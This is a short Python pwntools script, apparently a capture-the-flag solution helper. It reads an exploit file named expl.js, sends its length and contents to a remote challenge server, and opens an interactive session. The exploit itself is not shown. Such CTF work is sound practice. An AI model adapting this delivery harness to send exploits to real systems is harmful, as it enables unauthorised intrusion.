#!/usr/bin/python3
from pwn import *

if __name__ == '__main__':
	f = open('expl.js','rb')
	code = f.read()
	io = remote('chal.duc.tf',30004)
	io.sendlineafter('100KB): ',str(len(code)))
	io.sendline(code)
		
	io.interactive()
